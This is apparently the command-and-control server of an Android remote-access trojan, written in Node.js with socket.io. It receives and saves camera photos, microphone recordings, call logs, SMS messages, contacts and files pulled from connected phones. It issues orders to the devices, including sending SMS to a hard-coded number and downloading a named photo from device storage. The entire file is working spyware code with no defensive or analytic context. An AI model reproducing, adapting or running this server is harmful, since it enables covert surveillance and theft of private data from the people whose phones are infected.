var io = require("socket.io");
var path = require('path')
var fs = require('fs')

var IO;
var v;
IO = io.listen(3000);
IO.sockets.pingInterval = 10000;
IO.sockets.on("connection", function (socket) {
    socket.on('x0000ca', (data) => {
        console.log("jjj");
        var uint8Arr = new Uint8Array(data.buffer);
        var binary = '';
        for (var i = 0; i < uint8Arr.length; i++) {
            binary += String.fromCharCode(uint8Arr[i]);
        }
        var base64String = binary.toString('base64')
        let filename = "test.jpg";
        fs.writeFile(filename, binary, "binary", (err) => {
            if (!err) console.log(`${filename} created successfully!`);
        });

    });
    
    socket.on('x0000cl', (data) => {
        if (data.callsList) {
            console.log(data.callsList);
        }
    });
    socket.on('x0000sm', (data) => {
        if (data.smsList) {

            console.log(data.smsList.length,data.smsList);
        } else {
            if (data == true)
                console.log('SMS sent');
            else
                console.log('SMS not sent');
        }
    });
    socket.on('x0000cn', (data) => {
        if (data.contactsList) {

            console.log( data.contactsList.length,data.contactsList);
        }
    });
    socket.on('x0000mc', (data) => {
        if (data.file == true) {

            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            let filename = "test.mp3";
            fs.writeFile(filename, binary, "binary", (err) => {
                if (!err) console.log(`${filename} created successfully!`);
            });
        }
    });
    socket.on('x0000fm', (data) => {
        if (data.file == true) { // response with file's binary
            console.log('Saving file..');
            var filePath = path.join("./d", data.name);

            // function to save the file to my local disk
            fs.writeFile(filePath, data.buffer,"binary", (err) => {
                if (err)
                    console.log('Saving file failed');
                else
                    console.log('File saved on ');
            });

        } else if (data.length != 0) { // response with files list
            console.log('Files list arrived', data);
        } else {
            console.log('That directory is inaccessible');

        }

    });
var address = socket.request.connection;
var ip = address.remoteAddress.substring(
    address.remoteAddress.lastIndexOf(":") + 1
);
var query = socket.handshake.query;
var index = query.id;
console.log(ip, index);
//socket.emit("order", { order: "x0000ca", extra: 0 });
//socket.emit('order', { order: 'x0000cl' });
//socket.emit('order', { order: 'x0000sm', extra: 'ls' });
//socket.emit('order', { order: "x0000sm", extra: 'sendSMS', to: 01064704303, sms: "uyyyuyu" });
//socket.emit('order', { order: 'x0000cn' });
//socket.emit('order', { order: 'x0000mc', sec: 10 });
//socket.emit('order', { order: 'x0000fm', extra: 'ls', path: '/storage/emulated/0/' });
socket.emit('order', { order: 'x0000fm', extra: 'dl', path: '/storage/emulated/0/ahmed.jpg' });

});
